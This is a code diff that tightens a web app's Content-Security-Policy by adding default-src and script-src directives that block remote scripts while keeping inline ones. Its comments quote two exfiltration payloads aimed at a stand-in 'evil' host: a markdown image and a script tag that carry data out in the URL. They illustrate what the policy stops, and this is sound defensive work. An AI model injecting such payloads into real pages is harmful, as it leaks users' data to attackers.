@@ -17,15 +17,21 @@
 //   (`![x](https://evil/?d=<data>)` loads with no click). srcdoc iframes INHERIT
 //   the page policy, so one header covers chat, documents, the DS README, deck
 //   slides, the export frame and the print window, streaming and old messages
-//   alike. script-src stays open on purpose: the slide editor runtime and the
-//   imported design-system scripts are inline (deck scripts are the sanitizer's
-//   job). Remote origins a customer's design system really needs are allowed
+//   alike. It also adds `default-src 'self'` and `script-src 'self'
+//   'unsafe-inline'` (ADR-9): the slide editor runtime and the imported
+//   design-system scripts are inline, so inline stays; a REMOTE script
+//   (`<script src=https://evil/x.js?d=<data>>`, injected by a DS card or by a
+//   slide that got past the sanitizer) is blocked and reported. Neither
+//   directive ever takes an allowlist origin (a script CDN serves attacker-
+//   publishable code), blob: or 'unsafe-eval'; a DS that needs a library
+//   vendors it in the zip. Frame self-navigation and WebRTC from inline script
+//   remain until the frames get their own origin and policy. Remote origins a customer's design system really needs are allowed
 //   by an admin (app_settings.external_asset_origins, read through
 //   server/egressSetting.ts, never awaited here) or by EXTERNAL_ASSET_ORIGINS;
 //   they open img-src, font-src and style-src only, never connect-src,
 //   media-src or frame-src (those would be fetch/navigation channels).
 //   CSP_EGRESS=report (app.yaml, redeploy the same build) is the way back: the
-//   egress directives leave this header and only the Report-Only policy
+//   egress directives and the two script directives leave this header and only the Report-Only policy
 //   (server/middleware/security.ts, which already carries them) watches.
 // - numeric ids: every :id/:messageId route reads a BIGINT key. A malformed id
 //   used to reach Postgres and come back as a 500 with the raw driver message
@@ -46,6 +52,9 @@ const BASE_DIRECTIVES = ["frame-ancestors 'self'", "base-uri 'self'", "object-sr
 // where blocked loads of the enforced policy are reported (the same PII-free csp_violation path the Report-Only header uses)
 const REPORT_DIRECTIVES = ['report-uri /api/csp-report', 'report-to csp-endpoint']
 
+/** Remote scripts blocked, inline kept. Never takes an allowlist origin, blob:, 'unsafe-eval' or *. */
+export const SCRIPT_DIRECTIVES = ["default-src 'self'", "script-src 'self' 'unsafe-inline'"]
+
 /** The six egress directives. Allowed origins open img-src, font-src and style-src only. */
 export function egressDirectives(policy: EgressPolicy): string[] {
   const o = policy.allowedOrigins.map((a) => a.origin)
@@ -63,7 +72,7 @@ export function egressDirectives(policy: EgressPolicy): string[] {
 /** Pure: the Content-Security-Policy header value for a mode and a policy. */
 export function buildContentSecurityPolicy(opts: { mode: CspEgressMode; policy: EgressPolicy }): string {
   if (opts.mode === 'report') return BASE_DIRECTIVES.join('; ')
-  return [...BASE_DIRECTIVES, ...egressDirectives(opts.policy), ...REPORT_DIRECTIVES].join('; ')
+  return [...BASE_DIRECTIVES, ...SCRIPT_DIRECTIVES, ...egressDirectives(opts.policy), ...REPORT_DIRECTIVES].join('; ')
 }
 
 type Env = Record<string, string | undefined>
